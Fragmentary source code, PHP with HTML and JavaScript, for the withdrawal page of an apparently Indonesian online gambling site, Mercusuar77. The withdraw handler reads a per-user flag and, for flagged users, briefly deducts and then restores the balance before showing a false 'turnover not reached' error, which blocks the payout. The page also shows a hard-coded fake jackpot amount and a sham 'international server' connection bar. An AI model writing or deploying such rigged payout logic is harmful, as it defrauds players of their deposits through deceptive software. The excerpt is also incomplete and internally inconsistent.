...
function fb_req($path, $method = 'GET', $data = null) {
...
if(empty($un)) { header("Location: index.php"); exit; }

// --- 1. AMBIL DATA USER SITUS 4 ---
// --- SUDAH FIX: Jalur ditarik dari users_situs4 ---
$u_path = "users_situs1/" . trim($un);
$u_data = fb_req($u_path);

$saldo_game = (float)($u_data['saldo'] ?? 0);
$bank_user  = $u_data['bank_name'] ?? '-';
$norek_user = $u_data['acc_no'] ?? '-';
$nama_user  = $u_data['acc_name'] ?? $un;
$status_wd  = strval($u_data['status_wd'] ?? '0');

// --- 2. LOGIC PROSES WITHDRAW ---
if (isset($_POST['proses_withdraw.php'])) {
    header('Content-Type: application/json');
    
    // --- PENAMBAHAN PENTING: Refresh data user dari Firebase ---
    // Agar status_wd selalu mengambil nilai terbaru (real-time) saat tombol diklik
    $u_data_latest = fb_req($u_path);
    $status_wd = strval($u_data_latest['status_wd'] ?? '0');
    $saldo_game = (float)($u_data_latest['saldo'] ?? 0);
    // ---------------------------------------------------------

    $amount_input = (int)preg_replace('/[^0-9]/', '', $_POST['amount']); 
    
    // --- FITUR ANTI-SPAM ---
    $all_wd = fb_req("withdraw_request");
    $is_pending = false;

    if ($all_wd) {
        foreach ($all_wd as $key => $val) {
            if ($val['username'] === $un && $val['status'] === "Pending") {
                $is_pending = true;
                break;
            }
        }
    ...
    if ($is_pending) {
        echo json_encode([
            'status' => 'error', 
            'msg' => "⚠️ PERMINTAAN TERTUNDA! ⚠️\nMasih ada penarikan yang sedang diproses. Harap tunggu hingga selesai."
        ]);
        exit;
    }

    // --- VALIDASI NOMINAL ---
    if ($amount_input < 50000) {
        echo json_encode(['status' => 'error', 'msg' => 'Minimal WD adalah Rp 50.000']);
    } elseif ($amount_input > $saldo_game) {
        echo json_encode(['status' => 'error', 'msg' => 'Saldo Anda tidak mencukupi!']);
    } else {
        // --- SKENARIO BERDASARKAN STATUS_WD TERBARU ---
        if ($status_wd === '1') {
            echo json_encode([
                'status' => 'error', 
            ...
            fb_req($u_path, "PATCH", ['saldo' => (float)($saldo_game - $amount_input)]);
            usleep(300000); 
            fb_req($u_path, "PATCH", ['saldo' => (float)$saldo_game]);
            ...
            echo json_encode([
                'status' => 'error', 
                'msg' => "⚠️ PENARIKAN GAGAL! ⚠️\nSyarat Turnover belum tercapai. Harap bermain kembali atau hubungi CS."
            ]);
        } else {
            // NORMAL: WD LOLOS
            $new_balance = $saldo_game - $amount_input;
            fb_req($u_path, "PATCH", ['saldo' => $new_balance]);
            ...
            fb_req("withdraw_requests_situs1", "POST", $wd_log);
...
<meta property="og:image" content="/assets/banners/situspnjng.png">
...
<meta name="twitter:image" content="/assets/banners/situspnjng.png">
<meta property="og:image:alt" content="Mercusuar77">
<meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1, user-scalable=no">

<meta property="og:url" content="https://www.Mercusuar77.com/">
<link rel="canonical" href="https://www.Mercusuar77.com/">
...
<a href="https://wa.me/message/HUKZE3ZICYNQC1" target="_blank" rel="nofollow"><img src="/assets/media.tenor.com/Spdlu7aT88AAAAAj/wp.gif" style="object-fit:cover;" width="40" height="40" border="0" alt="WA Mercusuar77"></a></div> 
<script>
window.addEventListener("load", function () {
  ...
  popup.style.cssText = `
    ...
    background: rgba(10,10,10,0.92); /* Gelap pekat maskulin */
    display: none;
  ...
  popup.innerHTML = `
    ...
    ">
      ...
      <h4 style="font-size: 14px; color:#ff007f; letter-spacing: 1px; font-weight: bold;">FITUR EKSKLUSIF SERVER INTERNATIONAL</h4>
      <hr style="border: 1px solid #222;">
      <h3 style="text-align:center; color:#fff; font-weight: bold; text-shadow: 0 0 8px rgba(255, 0, 127, 0.5);">SERVER INTERNATIONAL</h3>
      <p style="text-align:center; color:#aaa;">Silahkan Pilih Server:</p>
      ...
      ">
        <div id="progressBar" style="
          width: 0%;
          background: linear-gradient(90deg, #ff007f, #aa0055);
          height: 100%;
          text-align: center;
          color: #fff;
          font-size: 13px;
      ...
      <p id="statusText" style="text-align: center; font-weight: bold; color:#ff007f; height: 20px; margin-bottom: 15px;"></p>
  ...
  document.getElementById("btnConnect").addEventListener("click", () => {
    ...
    // Reset warna awal saat loading berproses kembali
    bar.style.background = "linear-gradient(90deg, #ff007f, #aa0055)";
    status.innerText = "";
    hasConnected = true;
    ...
    const interval = setInterval(() => {
      ...
      if (progress >= 100) {
        ...
        bar.style.background = "#00ff7f"; /* Menggunakan warna hijau neon solid (Success) saat 100% */
        bar.style.color = "#000";
        bar.textContent = "100%";
        status.innerText = "Koneksi Berhasil! Mengalihkan...";
        status.style.color = "#00ff7f";

        // Pengalihan halaman ke menu slots
        setTimeout(() => {
...
<script src="/assets/js/bootstrap/bootstrap.min.js"></script>
  ...
  <ul class="side-nav-items">
    <li class="nav-item">
      ...
      <a class="navlink" href="https://www.Mercusuar77.com/home.php" onclick="closeNav(-1);">
    ...
    <li class="nav-item">
      ...
      <div class="nav-item-content" [ngclass]="{'open':isOpenNavContent[0], '':!isOpenNavContent[0]}">
        <ul class="submenu account">
          <li>
            <a href="https://www.Mercusuar77.com/deposit.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-pig"></i></span></div>
              <div class="fs-sm mt-1" i18n="">Deposit</div>
            </a>
          </li>
          <li>
            <a href="https://www.Mercusuar77.com/withdraw.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-transfer"></i></span></div>
              <div class="fs-sm mt-1" i18n="">Withdraw</div>
            </a>
          </li>
          <li>
            <a href="https://www.Mercusuar77.com/history.php" (click)="closeNav($event);">
          ...
          <li>
            <a href="https://www.Mercusuar77.com/refferal.php" (click)="closeNav($event);">
      ...
      <div class="nav-item-content games" [ngclass]="{'open':isOpenNavContent[1], '':!isOpenNavContent[1]}">
        <ul class="submenu">
                  ...
                  <i  class="icon-others"></i>    -->
                                   ...
                                   <li>  <a href="https://www.Mercusuar77.com/slot.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-slot"></i>
              ...
              <div class="fs-sm mt-1">SLOTS</div>
                                                ...
                                                <li>  <a href="https://www.Mercusuar77.com/live.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <img src="/assets/images/live_game_icon.gif?v=1" ref="live game" height="41px">               
                </span>
                   <span class="hot sub" style="">HOT</span>
              </div>
              <div class="fs-sm mt-1">LIVE GAMES</div>
                                                ...
                                                <li>  <a href="https://www.Mercusuar77.com/sports.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
              ...
              <div class="fs-sm mt-1">SPORTS</div>
                                                ...
                                                <li>    <a href="https://www.Mercusuar77.com/casino.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
              ...
              <div class="fs-sm mt-1">CASINO</div>
                                                ...
                                                <li>
              <a href="https://www.Mercusuar77.com/lottery.php" (click)="closeNav(-1);">
                <div class="">
                    <span class="circle">
                      <i class="icon-lottery"></i>
                ...
                <div class="fs-sm mt-1">LOTRE</div>
                                                ...
                                                <li>
              <a href="https://www.Mercusuar77.com/fish-hunter.php" (click)="closeNav(-1);">
                <div class="">
                    <span class="circle">
                ...
                <div class="fs-sm mt-1">TEMBAK IKAN</div>
                                                ...
                                                <li>   <a href="https://www.Mercusuar77.com/e-games" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-others"></i>
                </span>
            ...
            <li class="nav-item">
      <a class="navlink" href="https://www.Mercusuar77.com/promosaya.php" onclick="closeNav(-1);">
      ...
      <a class="navlink" href="https://www.Mercusuar77.com/promotion.php" onclick="closeNav(-1);">
      ...
      <a class="navlink" href="https://www.Mercusuar77.com/referral.php" onclick="closeNav(-1);">
      ...
      <a class="navlink" href="https://www.Mercusuar77.com/rtpbaby.php" target="_blank" onclick="closeNav(-1);">
        <div>
          <i></i>
    ...
    <li class="nav-item">
      ...
      <a class="navlink" href="https://www.Mercusuar77.com/info.php" onclick="closeNav(-1);">
    ...
    <li class="nav-item">
      <a class="navlink" href="https://www.Mercusuar77.com/contact-us.php" onclick="closeNav(-1);">
    ...
    <li class="nav-item">
      <a class="navlink" href="https://www.Mercusuar77.com/" onclick="closeNav(-1);">
...
<button id="btnToggleSideNav" class="btn btn-link" aria-label="side nav toggle">
  ...
  <a href="https://www.Mercusuar77.com/" title="" class="logo">
                ...
                <div class="row text-left">
                  <div class="col-xs-6">
                    <button class="btn btn-clear btn-refresh-wallet">
                      ...
                      <span class="bal-txt">IDR <?php echo number_format($saldo_game, 0, '.', ','); ?></span>
                    </button>
                  </div>
              ...
              <div class="mdc-tab-scroller__scroll-area mdc-tab-scroller__scroll-area--scroll mdc-tab-scroller__scroll-x" style="margin-bottom: 0px;">
                <div class="mdc-tab-scroller__scroll-content">
                  <ul class="list-inline">
                    <li>
                      <div class="deposit-notice-menu">
                            <!---->
                    <a role="tab" href="deposit.php" data-active="accountdeposit" class="mdc-tab" aria-selected="false" tabindex="-1" id="goog_2098347606-FIXED-0">
                  ...
                  <!---->
                    ...
                    <li>
                      <a role="tab" href="withdraw.php" data-active="accountwithdrawal" class="mdc-tab mdc-tab--active" aria-selected="true" tabindex="0" id="goog_2098347606-FIXED-1">
                        <span class="mdc-tab__content">
...
<div class="content">
    <div class="pb-4 pb-md-0 col-md-8">
        <div class="title"><h6 class="d-none d-md-block">Formulir Penarikan Dana</h6></div>
        
        <form id="withdrawForm" method="post" action="proseswd.php" class="needs-validation" novalidate="novalidate">
            <div class="box-wrapper">
                <div class="row d-flex align-items-center mb-3">
                    <div class="col-md-3 col-xs-4">
                        <div class="font-weight-bold">Dompet</div>
                    </div>
                    <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                        <div class="form-check d-flex">
                            <label class="radio m-15">
                                <input id="game_wallet" class="with-gap" name="wallet_type" checked="" type="radio" value="game">
                                <span class="filter-title">
                                    <span class="wallet-type-title">Permainan</span>
                                    <span class="wallet-type-amount">IDR <?php echo number_format($saldo_game, 0, '.', ','); ?></span>
                                </span>
                            </label>
                            <label class="radio m-15">
                                <input id="ref_wallet" class="with-gap" name="wallet_type" type="radio" value="referral">
                                <span class="filter-title">
                                    <span class="wallet-type-title">Referral</span>
                                    <span class="wallet-type-amount">IDR 0</span>
                                </span>
                            </label>
                        </div>
                    </div>
                ...
                <div class="row d-flex align-items-center mb-3">
                    <div class="col-md-3 col-xs-4">
                        <div class="font-weight-bold">Jumlah (Min. 50,000)</div>
                    </div>
                    <div class="col-md-9 col-xs-8">
                        <div class="input-group">
                            ...
                            <input type="tel" class="form-control number" name="amount" id="withdrawal_amount" autocomplete="off" placeholder="Contoh: 50,000" required>
                        </div>
                    </div>
                </div>

                <div class="row d-flex align-items-center mb-3" id="existingbank_show">
                    <div class="col-md-3 col-xs-4">
                        <div class="font-weight-bold">Bank Tujuan<span class="text-danger">*</span></div>
                    </div>
                    <div class="col-md-9 col-xs-8">
                        <select class="form-control" name="user_acc_id" id="existing_bank">
                            <option value="65ba77"><?php echo "$bank_user - " . substr($norek_user, 0, 4) . "XXXX" . substr($norek_user, -4); ?></option>
                        </select>
                    </div>
                </div>
                ...
                <div class="row d-flex align-items-center mb-4">
                    <div class="col-md-3 col-xs-4">
                        <div class="font-weight-bold">Atas Nama</div>
                    </div>
                    <div class="col-md-9 col-xs-8">
                        <input type="text" readonly="" name="acc_name" value="<?php echo $nama_user; ?>" class="form-control" id="fullName">
                    </div>
                </div>
                ...
                <div class="row d-flex align-items-center">
                    ...
                    <div class="col-md-9 col-xs-8">
                        <button type="submit" class="btn btn-primary btn-lg w-100" id="btn-submit">Withdraw Sekarang</button>
                    </div>
                </div>
            </div>
        </form>
        ...
        <div class="acc_safety_info box-wrapper deposit-notice-wraper">
            <div class="deposit-notice-content">
                ...
                <ul>
                    <li>Minimal penarikan adalah <strong>Rp 50.000</strong>.</li>
                    <li>Pastikan nama rekening sesuai dengan data yang terdaftar.</li>
                    <li>Proses penarikan memakan waktu 3-5 menit kecuali bank sedang gangguan.</li>
                </ul>
            </div>
        </div>
    </div>
...
$(document).ready(function () {
    ...
    // 2. Logic Withdraw dengan AJAX + SweetAlert2
    $('#withdrawForm').submit(function(e) {
        e.preventDefault();

        var nominalStr = $('#withdrawal_amount').val().replace(/,/g, '');
        var nominal = parseInt(nominalStr);
        var saldo = <?php echo (int)$saldo_game; ?>;
        ...
        Swal.fire({
            title: 'Konfirmasi WD?',
            text: "Saldo akan otomatis dipotong Rp " + nominal.toLocaleString(),
            icon: 'question',
            ...
            if (result.isConfirmed) {
                ...
                $.ajax({
                    url: 'proses_withdraw.php', // Mengarah ke file proseswd.php yang sudah ada
                    type: 'POST',
                    data: {
                        proses_wd_ajax: true, // Untuk trigger di PHP
                        amount: nominal,
                        wallet_type: $('input[name="wallet_type"]:checked').val(),
                        user_acc_id: $('#existing_bank').val(),
                        acc_name: $('#fullName').val()
                    },
                    success: function(response) {
                        // Jika respon PHP berupa JSON string, kita parse. Jika sudah object, biarkan.
    ...
    <nav class="navbar-inverse navbar-fixed-bottom">
        <div class=" ">
                ...
                <div class="  footericon-single">
                    <a href="home.php"><i class="icon-home"></i><div>HOME</div></a>
                </div>
                ...
                <div class=" footericon-single">
                    ...
                    <ul class="list-inline horizontal-hover togglemenu-content" id="fundshover_menu">
                      <li>
                        <a href="deposit.php" (click)="closeNav($event);">
                            <div class="fs-sm mt-1" i18n="">Deposit</div>
                        </a>
                      </li>
                      <li>
                      ...
                      <li>
                        <a href="history.php" (click)="closeNav($event);">
                          <div class="fs-sm mt-1" i18n="@History">Pernyataan &nbsp;</div>
                        </a>
                      </li>
                    </ul>
                                                ...
                                                <div class=" footericon-single">
                    <a href="memo.php" style="position:relative;"><i class="icon-mail_outline"></i> <div>MEMO</div>
...
$(document).ready(function(){
    // Matikan fungsi ambil saldo game lain agar tidak memicu 404
    window.getAllGameBal = function() {
        console.log("Fungsi saldo dimatikan oleh Bos Cipung agar tidak 404");
        // Kita kasih respon palsu aja biar gak error
        $('#other-game-bals').html('<div style="padding:10px; color:gold;">Saldo Terintegrasi</div>');
    };

    // Fungsi tutup menu navigasi tetap biarkan saja karena ini urusan tampilan (CSS)
    $( "#mainContentContainer" ).click(function() {
        $( "#sideNav, #mainContent, #r-side-bar" ).removeClass( "navContentOpen open sideNavOpen rightSideBarOpen" );
    });
});
...
<script>
        ...
        window.onLogOut = async function(){
            ...
            window.location.href="https://www.Mercusuar77.com/";

        }
       // Kosongkan konfigurasi Firebase agar tidak berat
window.fbs = {}; 
window.firebasSuccessCb = function (params){ 
    console.log("Firebase bypass"); 
};

// Tetap simpan pengaturan mata uang & agen Bos
window.currencyCode = 'IDR';
window.lang = "id";
window.agentCode = 'Mercusuar77';

// Gunakan fungsi alert yang simpel saja
...
// Biarkan fungsi format angka tetap ada (karena berguna untuk tampilan WD)
window.formatNumber = function (n) {
    return n.replace(/[^0-9\-]/g, "").replace(/\B(?=(\d{3})+(?!\d))/g, ",");
};
window.convertToNumber = function (value) {
    if (!value) return 0;
    var number = value.toString().replace(/[^0-9.-]+/g, "");
    return isNaN(number) ? 0 : number;
};

                window.ajax_jackpot = function () {
    // Dimatikan agar tidak 404
    console.log("Jackpot disabled");
    $('.jackpot_numbers_home').html(`IDR <span id="jackpot_amount">1.250.000.000</span>`); // Kasih angka tembak aja
}
